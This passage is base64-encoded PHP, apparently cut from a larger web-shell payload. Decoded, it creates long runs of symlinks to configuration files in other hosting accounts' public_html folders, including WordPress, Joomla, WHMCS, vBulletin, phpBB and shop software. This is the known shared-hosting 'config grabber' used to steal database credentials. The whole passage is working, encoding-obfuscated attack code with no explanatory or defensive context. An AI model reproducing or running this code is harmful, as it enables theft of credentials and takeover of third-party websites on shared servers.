aWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2Uuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3Quc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3Rpbmcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3Muc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3Auc2h0bWwnKTsN